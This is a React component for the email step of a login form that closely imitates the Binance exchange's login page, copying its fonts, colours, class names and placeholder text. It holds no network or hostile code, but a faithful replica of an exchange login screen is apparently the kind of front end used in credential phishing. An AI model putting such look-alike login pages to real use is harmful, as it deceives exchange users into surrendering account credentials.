
import { FC, useState } from "react";
import { Button } from "@/components/ui/button";
import { Loader } from "lucide-react";

interface EmailStepProps {
  email: string;
  isLoading: boolean;
  onSubmit: (email: string) => void;
}

export const EmailStep: FC<EmailStepProps> = ({ email: initialEmail, isLoading, onSubmit }) => {
  const [email, setEmail] = useState(initialEmail);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      onSubmit(email);
    }
  };

  return (
    <>
      {/* Header */}
      <div className="flex justify-between items-center mb-8">
        <div 
          className="card-page-title !mb-[0px]" 
          role="heading" 
          aria-level={1}
          style={{ 
            color: "var(--color-PrimaryText, #EAECEF)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "24px",
            fontWeight: "600",
            lineHeight: "32px"
          }}
        >
          Log in
        </div>
        <div className="max-md:hidden h-[40px]">
          <div className="bn-tooltips-wrap qrcode-login-popup">
            <div className="bn-tooltips-ele">
              <div 
                className="p-[4px] w-[40px] h-[40px] rounded-[8px] cursor-pointer qr-login-icon transition-colors hover:bg-[#2B3139]"
                style={{ backgroundColor: "var(--color-Vessel, #1E2329)" }}
                role="button" 
                aria-label="QR code login" 
                tabIndex={0}
              >
                <svg 
                  className="w-[32px] h-[32px]" 
                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
                  viewBox="0 0 24 24" 
                  xmlns="http://www.w3.org/2000/svg"
                  fill="currentColor"
                >
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 9.5V3H3v6.5h6.5zm1 1.5H2a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5h8.5a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M4.884 5.035h2.581v2.58h-2.58v-2.58zM4.884 16.535h2.581v2.58h-2.58v-2.58z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M9.5 21v-6.5H3V21h6.5zm1 1.5H2a.5.5 0 01-.5-.5v-8.5A.5.5 0 012 13h8.5a.5.5 0 01.5.5V22a.5.5 0 01-.5.5zM21 9.5V3h-6.5v6.5H21zm1 1.5h-8.5a.5.5 0 01-.5-.5V2a.5.5 0 01.5-.5H22a.5.5 0 01.5.5v8.5a.5.5 0 01-.5.5z" />
                  <path d="M16.535 5.035h2.58v2.58h-2.58v-2.58zM15.5 22.5V20H13v2.5h2.5z" />
                  <path fillRule="evenodd" clipRule="evenodd" d="M15.5 18v-2.5H18V13h-5v5h2.5zM22.5 20H20v-2.5h-2.5v5h5V20z" />
                  <path d="M22.5 15.5V13H20v2.5h2.5z" />
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Email Form */}
      <form onSubmit={handleSubmit}>
        <div className="bn-formItem mb-6">
          <label 
            className="bn-formItem-label block mb-2" 
            htmlFor="email-input"
            style={{ 
              color: "var(--color-PrimaryText, #EAECEF)",
              fontFamily: "BinanceNova, Arial, sans-serif",
              fontSize: "14px",
              fontWeight: "400",
              lineHeight: "20px"
            }}
          >
            Email/Phone number
          </label>
          <div>
            <div className="css-4cffwv">
              <div 
                className="bn-textField bn-textField__line data-size-large username-input-field css-8x1t0r rounded"
                style={{
                  backgroundColor: "var(--color-Input, #2B3139)",
                  border: "1px solid var(--color-InputLine, #474D57)"
                }}
                role="group"
              >
                <input
                  placeholder="Email/Phone (without country code)"
                  type="text"
                  role="textbox"
                  aria-label="Username field for email or phone number"
                  name="username"
                  autoFocus
                  id="email-input"
                  autoCapitalize="off"
                  className="bn-textField-input bg-transparent border-0 text-white p-3 w-full outline-none h-12 text-sm leading-5"
                  style={{ 
                    color: "var(--color-PrimaryText, #EAECEF)",
                    fontFamily: "BinanceNova, Arial, sans-serif",
                    fontSize: "14px",
                    fontWeight: "400",
                    lineHeight: "20px"
                  }}
                  spellCheck="false"
                  autoComplete="username"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
            </div>
          </div>
        </div>

        <Button
          className="w-full py-3 rounded transition-colors"
          style={{
            backgroundColor: "var(--color-BtnBg, #FCD535)",
            color: "var(--color-TextOnYellow, #202630)",
            fontFamily: "BinanceNova, Arial, sans-serif",
            fontSize: "14px",
            fontWeight: "500",
            lineHeight: "20px",
            height: "48px"
          }}
          type="submit"
          disabled={isLoading || !email.trim()}
        >
          {isLoading ? (
            <Loader className="animate-spin h-4 w-4" />
          ) : (
            "Next"
          )}
        </Button>
      </form>
    </>
  );
};
